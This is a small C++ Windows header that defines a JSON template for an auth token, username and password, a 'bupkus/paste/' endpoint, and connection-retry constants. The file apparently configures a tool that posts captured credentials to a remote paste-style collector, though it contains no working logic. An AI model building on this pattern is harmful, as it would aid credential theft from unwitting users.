#ifndef _BUPKUS_H_
#define _BUPKUS_H_

#include <Windows.h>
#include <stdint.h>

constexpr char c_JsonTemplate[] =
"{\n"
"    \"auth_token\": \"%s\",\n"
"    \"username\": \"%s\",\n"
"    \"password\": \"%s\"\n"
"}";

constexpr wchar_t c_Endpoint[] = L"bupkus/paste/";
constexpr wchar_t c_ContentType[] = L"Content-Type: application/json; charset=ascii\r\n";
constexpr uint32_t c_ConnectAttempts = 5;
constexpr uint32_t c_RetryInterval = 30 * 1000;  // 30 seconds, in milliseconds

#endif  // _BUPKUS_H_